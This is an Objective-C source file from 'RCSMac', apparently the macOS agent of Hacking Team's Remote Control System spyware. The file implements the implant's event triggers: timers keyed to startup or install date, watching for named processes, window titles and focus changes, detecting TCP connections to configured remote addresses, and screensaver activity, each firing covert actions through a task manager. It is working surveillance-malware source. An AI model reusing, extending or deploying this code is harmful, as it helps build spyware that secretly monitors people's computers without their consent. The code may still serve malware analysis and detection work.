/*
 * RCSMac - Events
 *
 *  Provides all the events which should trigger an action
 *
 * Created by Alfredo 'revenge' Pesoli on 26/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include <sys/param.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <sys/socketvar.h>
#include <sys/sysctl.h>

#include <net/route.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>

#include <netinet/in_pcb.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp_var.h>
#include <netinet/igmp_var.h>
#include <netinet/ip_var.h>
#include <netinet/tcp.h>
#include <netinet/tcpip.h>
#include <netinet/tcp_seq.h>

#define TCPSTATES
#include <netinet/tcp_fsm.h>
#include <netinet/tcp_var.h>
#include <netinet/udp.h>
#include <netinet/udp_var.h>

#include <wchar.h>

#import "RCSMEvents.h"
#import "RCSMTaskManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


// That's really stupid, check param.h
// MAXCOMLEN	16		/* max command name remembered */ 
#define SCREENSAVER_PROCESS @"ScreenSaverEngin"


static RCSMEvents *sharedEvents = nil;
static NSMutableArray *connectionsDetected = nil;
NSLock *connectionLock;


@implementation RCSMEvents

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMEvents *)sharedEvents
{
  @synchronized(self)
  {
    if (sharedEvents == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
        connectionsDetected = [[NSMutableArray alloc] init];
      }
  }
  
  return sharedEvents;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedEvents == nil)
      {
        sharedEvents = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedEvents;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Events monitor routines
#pragma mark -

- (void)eventTimer: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL timerDailyTriggered = NO;
  
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];

  [configuration retain];
  
  timerStruct *timerRawData;
  NSDate *startThreadDate = [[NSDate date] retain];
  NSTimeInterval interval = 0;
  
  while ([configuration objectForKey: @"status"] != EVENT_STOP &&
         [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      timerRawData = (timerStruct *)[[configuration objectForKey: @"data"] bytes];
      
      int actionID      = [[configuration objectForKey: @"actionID"] intValue];
      int type          = timerRawData->type;
      uint low          = timerRawData->loDelay;
      uint high         = timerRawData->hiDelay;
      uint endActionID  = timerRawData->endAction;
      
      switch (type)
        {
        case TIMER_AFTER_STARTUP:
          {
            interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
            
            if (fabs(interval) >= low / 1000)
              {
#ifdef DEBUG_EVENTS
                warnLog(@"TIMER_AFTER_STARTUP (%f) triggered", fabs(interval));
#endif
                
                [taskManager triggerAction: actionID];
                
                [innerPool release];
                [outerPool release];
                
                [NSThread exit];
              }
            
            break;
          }
        case TIMER_LOOP:
          {
            interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];

            if (fabs(interval) >= low / 1000)
              {
#ifdef DEBUG_EVENTS
                infoLog(@"TIMER_LOOP (%f) triggered", fabs(interval));
#endif
                
                if (startThreadDate != nil)
                  [startThreadDate release];
                
                startThreadDate = [[NSDate date] retain];
                [taskManager triggerAction: actionID];
              }
            
            break;
          }
        case TIMER_DATE:
          {
            int64_t configuredDate = 0;
            configuredDate = ((int64_t)high << 32) | (int64_t)low;

            int64_t unixDate = (configuredDate - EPOCH_DIFF) / RATE_DIFF;
            NSDate *givenDate = [NSDate dateWithTimeIntervalSince1970: unixDate];
            
            if ([[NSDate date] isGreaterThan: givenDate])
              {
#ifdef DEBUG_EVENTS
                warnLog(@"TIMER_DATE (%@) triggered", givenDate);
#endif
                [taskManager triggerAction: actionID];
                
                [innerPool release];
                [outerPool release];
                
                [NSThread exit];
              }
            
            break;
          }
        case TIMER_DELTA:
          {
            int64_t configuredDate = 0;
            // 100-nanosec unit from installation date
            configuredDate = ((int64_t)high << 32) | (int64_t)low;
            // seconds unit from installation date
            configuredDate = configuredDate*(0.0000001);
    
            NSDictionary *bundleAttrib =
            [[NSFileManager defaultManager] attributesOfItemAtPath: [[NSBundle mainBundle] executablePath]          
                                                             error: nil]; 
            
            NSDate *creationDate = [bundleAttrib objectForKey: NSFileCreationDate];
        
            if (creationDate == nil)
              break;
            
            NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
                   
#ifdef DEBUG_EVENTS
            infoLog(@"TIMER_DELTA num of seconds %d, creationDate %@, givenDate %@", 
                    configuredDate, creationDate, givenDate);
#endif            
            if ([[NSDate date] isGreaterThan: givenDate])
            {
#ifdef DEBUG_EVENTS
              warnLog(@"TIMER_DELTA (%@) triggered", givenDate);
#endif
              [taskManager triggerAction: actionID];
              
              [innerPool release];
              [outerPool release];
              
              [NSThread exit];
            }
            
            break;
          }
        case TIMER_DAILY:
          {
            //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
            NSRange fixedRange;
            fixedRange.location = 11;
            fixedRange.length   = 8;
            
            NSString *currDateStr = [[NSDate date] description];
            NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
            
            [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];

            NSDate *dayDate = [NSDate dateWithString: dayStr];
            
#ifdef DEBUG_EVENTS
            infoLog(@"TIMER_DAILY dayDate %@", dayDate);
#endif   
            [dayStr release];
            
            NSDate *highDay = [dayDate addTimeInterval: (high/1000)];
            NSDate *lowDay = [dayDate addTimeInterval: (low/1000)];
            
#ifdef DEBUG_EVENTS
            infoLog(@"TIMER_DAILY min %@ max %@ curr %@ endActionID %d", 
                    lowDay, highDay, [NSDate date], endActionID);
#endif            
            if (timerDailyTriggered == NO &&
                [[NSDate date] isGreaterThan: lowDay] &&
                [[NSDate date] isLessThan: highDay])
            {
#ifdef DEBUG_EVENTS
              warnLog(@"TIMER_DAILY actionID triggered");
#endif
              [taskManager triggerAction: actionID];
              
              timerDailyTriggered = YES;
              
            } 
            else if (timerDailyTriggered == YES && 
                     ([[NSDate date] isGreaterThan: highDay] ||
                     [[NSDate date] isLessThan: lowDay]))
            {
              [taskManager triggerAction: endActionID];
              
              timerDailyTriggered = NO;
            }
            
            break;
          }
        default:
          {
            [innerPool release];
            [outerPool release];
            
            [NSThread exit];
          }
        }
      
      usleep(300000);
      
      [innerPool release];
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
#ifdef DEBUG_EVENTS
      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
#endif
      [configuration setValue: EVENT_STOPPED
                       forKey: @"status"];
      [configuration release];
    }
  
  if (startThreadDate != nil)
    [startThreadDate release];
  
  [outerPool release];
}

- (void)eventProcess: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  [configuration retain];
  
  int processAlreadyFound = 0;

  processStruct *processRawData;
  processRawData = (processStruct *)[[configuration objectForKey: @"data"] bytes];
  
  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
  int onTermination = processRawData->onClose;
  int lookForTitle  = processRawData->lookForTitle;
  
  unichar *_process = (unichar *)(processRawData->name + 0x3);
  size_t _pLen       = _utf16len(_process);
  
  BOOL onFocus  = NO;
  uint32_t mode = EVENT_PROCESS_NAME;
  
  if ((lookForTitle & EVENT_PROCESS_ON_FOCUS) == EVENT_PROCESS_ON_FOCUS)
    {
      onFocus = YES;
    }
  
  if (lookForTitle & EVENT_PROCESS_ON_WINDOW == EVENT_PROCESS_ON_WINDOW)
    {
      mode = EVENT_PROCESS_WIN_TITLE;
#ifdef DEBUG_EVENTS
      NSString *pr = [[NSString alloc] initWithCharacters: (unichar *)_process
                                                   length: _pLen];
      infoLog(@"WindowTitle (%@) Focus (%@)", pr, (onFocus) ? @"YES" : @"NO");
      [pr release];
#endif
    }
#ifdef DEBUG_EVENTS
  else
    {
      NSString *pr = [[NSString alloc] initWithCharacters: (unichar *)_process
                                                   length: _pLen];
      infoLog(@"WindowTitle (%@) Focus (%@)", pr, (onFocus) ? @"YES" : @"NO");
      [pr release];
    }
#endif
  
  while ([configuration objectForKey: @"status"]    != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      NSString *process = nil;
    
      process = [[NSString alloc] initWithCharacters: (unichar *)_process
                                              length: _pLen];
      
      // Empty processName - exiting
      if (_pLen == 0)
        [NSThread exit];
      
      switch (mode)
        {
        case EVENT_PROCESS_NAME:
          {
            if (processAlreadyFound != 0
                && findProcessWithName([process lowercaseString]) == YES
                && onFocus == YES)
              {
                //
                // Process was already found and we're looking for focus
                // thus we try to understand if the process has just lost focus
                //
                CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                   kCGNullWindowID);
                int firstPid = -1;
                
                for (NSMutableDictionary *entry in (NSArray *)windowList)
                  {
                    //
                    // kCGWindowLayer is equal 0 it means it's a windowed
                    // process (exclude tray process and stuff like that)
                    //
                    if ([[entry objectForKey: (id)kCGWindowLayer] intValue] == 0)
                      {
                        int _pid = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
                        
                        if (firstPid == -1)
                          {
                            firstPid = _pid;
                          }
                        else if (firstPid != _pid)
                          {
                            // Ok, we're on the second element which is the process
                            // who just lost focus
                            NSString *procLostFocus = [entry objectForKey: (id)kCGWindowOwnerName];
                            
                            if (matchPattern([[procLostFocus lowercaseString] UTF8String],
                                             [[process lowercaseString] UTF8String]))
                              {
                                processAlreadyFound = 0;
                                
                                if (onTermination != -1)
                                  {
#ifdef DEBUG_EVENTS
                                    warnLog(@"(%@) lost focus - end action (%d)", process, onTermination);
#endif
                                    [taskManager triggerAction: onTermination];
                                  }
                              }
#ifdef DEBUG_EVENTS
                            else
                              {
                                verboseLog(@"process currently looking for: %@", process);
                                verboseLog(@"process who lost focus: %@", procLostFocus);
                              }
#endif
                          }
                      }
                  }
                
                CFRelease(windowList);
              }
            else if (processAlreadyFound != 0
                     && findProcessWithName([process lowercaseString]) == NO
                     && onFocus == NO)
              {
                //
                // If process has already been found and we don't find it again, we
                // can clear the process found flag in order to trigger once again
                // the event in case the process is launched multiple times
                //
                processAlreadyFound = 0;
                
                if (onTermination != -1)
                  {
#ifdef DEBUG_EVENTS
                    warnLog(@"(%@) quitted - activating end action (%d)", process, onTermination);
#endif
                    [taskManager triggerAction: onTermination];
                  }
              }
            else if (processAlreadyFound == 0 && findProcessWithName([process lowercaseString]) == YES)
              {
                //
                // If we're looking for focus, we need to grab the first window
                // on screen and match the windowOwner within the process name
                // we're currently looking for
                //
                if (onFocus == YES)
                  {
                    NSDictionary *windowInfo = getActiveWindowInfo();
                    NSString *procWithFocus  = [windowInfo objectForKey: @"processName"];
                    
                    if (matchPattern([[procWithFocus lowercaseString] UTF8String],
                                     [[process lowercaseString] UTF8String]))
                      {
#ifdef DEBUG_EVENTS
                        warnLog(@"Process (%@) got focus", process);
#endif
                        processAlreadyFound = 1;
                      }
#ifdef DEBUG_EVENTS
                    else
                      {
                        verboseLog(@"process currently looking for: %@", process);
                        verboseLog(@"process with focus: %@", procWithFocus);
                      }
#endif
                  }
                else
                  {
                    // We're not looking for focus events
                    processAlreadyFound = 1;
                  }
                
                //
                // We can trigger the event if this flag is set to 1
                //
                if (processAlreadyFound == 1)
                  {
                    if (actionID != -1)
                      {
#ifdef DEBUG_EVENTS
                        warnLog(@"Application (%@) Executed, action %d", process, actionID);
#endif
                        if ([taskManager triggerAction: actionID] == FALSE)
                          {
#ifdef DEBUG_EVENTS
                            errorLog(@"Error while triggering action: %d", actionID);
#endif
                          }
                      }
                  }
              }
            break;
          }
        case EVENT_PROCESS_WIN_TITLE:
          {
            BOOL titleFound = NO;
            
            //
            // First see if the given entry has focus or is found inside the
            // current window list
            //
            if (onFocus == YES)
              {
                NSDictionary *windowInfo = getActiveWindowInfo();
                NSString *procWithFocus  = [windowInfo objectForKey: @"windowName"];
                
#ifdef DEBUG_EVENTS
                verboseLog(@"win focus: %@", procWithFocus);
#endif
                if (matchPattern([[procWithFocus lowercaseString] UTF8String],
                                 [[process lowercaseString] UTF8String]))
                  {
#ifdef DEBUG_EVENTS
                    warnLog(@"Window (%@) got focus", process);
#endif
                    titleFound = YES;
                  }
              }
            else
              {
                CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                   kCGNullWindowID);
                
                for (NSMutableDictionary *entry in (NSArray *)windowList)
                  {
                    NSString *windowName = [entry objectForKey: (id)kCGWindowName];
                    
                    //if (windowName != NULL && [windowName isCaseInsensitiveLike: process])
                    if (matchPattern([[windowName lowercaseString] UTF8String],
                                     [[process lowercaseString] UTF8String]))
                      {
#ifdef DEBUG_EVENTS
                        warnLog(@"Window (%@) was found (no focus)", process);
#endif
                        titleFound = YES;
                      }
                  }
                
                CFRelease(windowList);
              }
            
            //
            // If title is found for the first time, trigger if avail
            //
            if (processAlreadyFound == 0 && titleFound == YES)
              {
                processAlreadyFound = 1;
                
                if (actionID != -1)
                  {
#ifdef DEBUG_EVENTS
                    warnLog(@"Triggering action (%d)", actionID);
#endif
                    if ([taskManager triggerAction: actionID] == FALSE)
                      {
#ifdef DEBUG_EVENTS
                        warnLog(@"Error while triggering action: %d", actionID);
#endif
                      }
                  }
              }
            else if (processAlreadyFound != 0 && titleFound == YES)
              {
                //
                // Process was already found and we're looking for focus
                // thus we try to understand if the process has just lost focus
                //
                if (onFocus == YES)
                  {
                    CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                       kCGNullWindowID);
                    int firstPid = -1;
                    
                    for (NSMutableDictionary *entry in (NSArray *)windowList)
                      {
                        //
                        // kCGWindowLayer is equal 0 it means it's a windowed
                        // process (exclude tray process and stuff like that)
                        //
                        if ([[entry objectForKey: (id)kCGWindowLayer] intValue] == 0)
                          {
                            int _pid = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
                            
                            if (firstPid == -1)
                              {
                                firstPid = _pid;
                              }
                            else if (firstPid != _pid)
                              {
                                // Ok, we're on the second element which is the process
                                // who just lost focus
                                NSString *procLostFocus = [entry objectForKey: (id)kCGWindowName];
                                
                                if (matchPattern([[procLostFocus lowercaseString] UTF8String],
                                                 [[process lowercaseString] UTF8String]))
                                  {
                                    processAlreadyFound = 0;
#ifdef DEBUG_EVENTS
                                    warnLog(@"Application (%@) lost focus", process);
#endif
                                    if (onTermination != -1)
                                      {
#ifdef DEBUG_EVENTS
                                        warnLog(@"Window Title (%@) found (onTermination), action %d",
                                                process, onTermination);
#endif
                                        [taskManager triggerAction: onTermination];
                                      }
                                  }
#ifdef DEBUG_EVENTS
                                else
                                  {
                                    verboseLog(@"process currently looking for: %@", process);
                                    verboseLog(@"process who lost focus: %@", procLostFocus);
                                  }
#endif
                              }
                          }
                      }
                  
                    CFRelease(windowList);
                  }
              }
            else if (processAlreadyFound != 0 && titleFound == NO)
              {
                processAlreadyFound = 0;
              
                if (onTermination != -1)
                  {
#ifdef DEBUG_EVENTS
                    warnLog(@"Window Title (%@) not found (onTermination), action %d",
                            process, onTermination);
#endif
                    [taskManager triggerAction: onTermination];
                  }
              }
          
            break;
          }
        default:
          break;
        }
      
      usleep(300000);
      
      if (process != nil)
        {
          [process release];
        }
      [innerPool drain];
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
#ifdef DEBUG_EVENTS
      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
#endif
      [configuration setValue: EVENT_STOPPED
                       forKey: @"status"];
                       
      [configuration release];
    }
  
  [outerPool drain];
}

- (void)eventConnection: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  [configuration retain];
  
  char mibName[] = "net.inet.tcp.pcblist";
  size_t len = 0;
  char *buffer;
  connectionStruct *connectionRawData;

  BOOL connectionFound;
  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
  
  struct xinpgen *xig, *oxig;
  struct tcpcb *tp = NULL;
  struct inpcb *inp;
  struct xsocket *so;
  
  //[connectionsDetected retain];
  
  while ([configuration objectForKey: @"status"]    != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      connectionFound = FALSE;
      
      connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
      
      u_long ipAddress   = connectionRawData->ipAddress;
      u_long netMask     = connectionRawData->netMask;
      int connectionPort = connectionRawData->port;
      
      //ipAddress = inet_addr("0.0.0.0");
      //netMask = inet_addr("0.0.0.0");
      
      struct in_addr tempAddress;
      tempAddress.s_addr = ipAddress;

#ifdef DEBUG_EVENTS
      verboseLog(@"IP Address to Match: %s", inet_ntoa(tempAddress));
#endif

      if (sysctlbyname(mibName, 0, &len, 0, 0) >= 0)
        {
          if ((buffer = malloc(len)) != 0)
            {
              if (sysctlbyname(mibName, buffer, &len, 0, 0) < 0)
                {
#ifdef DEBUG_EVENTS
                  errorLog(@"Error on second sysctlbyname call");
#endif
                  
                  free(buffer);
                  
                  [NSThread exit];
                }
            }
          else
            {
#ifdef DEBUG_EVENTS
              errorLog(@"Error on malloc");
#endif
              
              free(buffer);
              [NSThread exit];
            }
        }
      else
        {
#ifdef DEBUG_EVENTS
          errorLog(@"Error on first sysctlbyname call");
#endif
          
          free(buffer);
          [NSThread exit];
        }
      
      oxig = xig = (struct xinpgen *)buffer;
      
      struct in_addr netMaskStruct;
      netMaskStruct.s_addr = netMask;
      
      NSString *ip        = [NSString stringWithUTF8String: inet_ntoa(tempAddress)];
      NSNumber *port      = [NSNumber numberWithInt: connectionPort];
      NSString *ipNetmask = [NSString stringWithUTF8String: inet_ntoa(netMaskStruct)];
      //NSString *ip        = [[NSString alloc] initWithUTF8String: inet_ntoa(tempAddress)];
      //NSNumber *port      = [[NSNumber alloc] initWithInt: connectionPort];
      //NSString *ipNetmask = [[NSString alloc] initWithUTF8String: inet_ntoa(netMaskStruct)];
      
      //
      // Cycle through all the TCP connections
      //
      for (xig = (struct xinpgen *)((char *)xig + xig->xig_len);
           xig->xig_len > sizeof(struct xinpgen);
           xig = (struct xinpgen *)((char *)xig + xig->xig_len))
        {
          tp  = &((struct xtcpcb *)xig)->xt_tp;
          inp = &((struct xtcpcb *)xig)->xt_inp;
          so  = &((struct xtcpcb *)xig)->xt_socket;
          
          //
          // Check only for TCP and ESTABLISHED connections
          //
          extern char *tcpstates[];
          const char *state = "ESTABLISHED";
          
          if (so->xso_protocol == IPPROTO_TCP && strncmp(tcpstates[tp->t_state],
                                                         state,
                                                         strlen(state)) == 0)
            {
#ifdef DEBUG_EVENTS
              verboseLog(@"Found an established connection: %s", inet_ntoa(inp->inp_faddr));
              verboseLog(@"Configured netmask: %@", ipNetmask);
#endif
              
              //
              // Check if the ip belongs to any local network
              // and if it's the ip that we are looking for
              //
              if (isAddressOnLan(inp->inp_faddr) == FALSE
                  && compareIpAddress(inp->inp_faddr, tempAddress, netMask) == TRUE)
                {
#ifdef DEBUG_EVENTS
                  warnLog(@"Address in list: %s (not on lan)", inet_ntoa(inp->inp_faddr));
#endif
                  
                  if (connectionPort == 0 || inp->inp_fport == connectionPort)
                    {
                      connectionFound = TRUE;
                      
                      //
                      // Check if the address hasn't been detected already
                      //
                      if (isAddressAlreadyDetected(ip,
                                                   connectionPort,
                                                   ipNetmask,
                                                   connectionsDetected) == FALSE)
                        { 
                          NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
                          NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
                          
                          NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
                                                                                   forKeys: keys];
                          
                          [connectionLock lock];
                          [connectionsDetected addObject: connection];
                          [connectionLock unlock];
                          
                          [keys release];
                          [objects release];
                          [connection release];
                          
#ifdef DEBUG_EVENTS
                          warnLog(@"Event Connection triggered!");
#endif
                          [taskManager triggerAction: actionID];
                        }
                    }
                }
            }
        }
      
      free(buffer);
      
      if (isAddressAlreadyDetected(ip,
                                   connectionPort,
                                   ipNetmask,
                                   connectionsDetected) == TRUE
          && connectionFound                            == FALSE)
        {
#ifdef DEBUG_EVENTS
          infoLog(@"Removing Connection");
#endif
          //
          // Connection has been found previously and now it's not there anymore
          // thus we remove it from our array in order to let it trigger again
          //
          NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
          NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
          
          NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
                                                                   forKeys: keys];
          [connectionLock lock];
          [connectionsDetected removeObject: connection];
          [connectionLock unlock];
          
          [keys release];
          [objects release];
          [connection release];
        }
      
      //[ip release];
      //[port release];
      //[ipNetmask release];
      
      [innerPool release];
      usleep(500000);
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
#ifdef DEBUG_EVENTS
      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
#endif
      [configuration setValue: EVENT_STOPPED forKey: @"status"];
      
      [connectionsDetected removeAllObjects];
      [configuration release];
    }
  
  [outerPool release];
}

- (void)eventScreensaver: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  [configuration retain];
  
  BOOL screenSaverFound = FALSE;
  
  while ([configuration objectForKey: @"status"] != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      int onTermination;
      
      [[configuration objectForKey: @"data"] getBytes: &onTermination];
      int actionID = [[configuration objectForKey: @"actionID"] intValue];
      NSString *process = [[NSString stringWithString: SCREENSAVER_PROCESS] retain];
      
      if (screenSaverFound == TRUE && findProcessWithName([process lowercaseString]) == NO)
        {
          screenSaverFound = FALSE;

          if (onTermination != -1)
            {
#ifdef DEBUG_EVENTS
              warnLog(@"Application (%@) Terminated, action %d", process, onTermination);
#endif
              [taskManager triggerAction: onTermination];
            }
        }
      else if (screenSaverFound == FALSE && findProcessWithName([process lowercaseString]) == YES)
        {
          screenSaverFound = TRUE;
#ifdef DEBUG_EVENTS
          warnLog(@"Application (%@) Executed, action %d", process, actionID);
#endif
          [taskManager triggerAction: actionID];
        }
      
      [process release];
      [innerPool release];
      
      usleep(500000);
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
#ifdef DEBUG_EVENTS
      verboseLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
#endif
      [configuration setValue: EVENT_STOPPED forKey: @"status"];
      [configuration release];
    }
  
  [outerPool release];
}

- (void)eventQuota: (NSDictionary *)configuration
{
  return;
}

@end
